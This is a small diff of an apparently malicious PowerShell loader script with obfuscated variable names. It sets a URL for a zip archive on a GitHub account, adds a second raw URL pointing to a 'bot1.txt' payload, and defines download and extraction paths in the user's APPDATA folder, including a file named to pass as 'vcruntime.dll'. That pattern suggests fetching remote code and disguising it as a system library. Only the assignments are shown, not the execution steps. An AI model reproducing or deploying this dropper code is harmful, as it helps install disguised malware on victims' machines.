@@ -1,5 +1,5 @@
 $ltrmn = 'https://github.com/blackcodeit407/system/blob/main/system1.zip?raw=true'
-$rawdll = ''
+$rawdll = 'https://raw.githubusercontent.com/blackcodeit407/system/refs/heads/main/bot1.txt'
 $kdsf = "$env:APPDATA\pzk.zip"
 $cwab = "$env:APPDATA\Extrac"
 $dll = "$env:APPDATA\Extrac\vcruntime.dll"
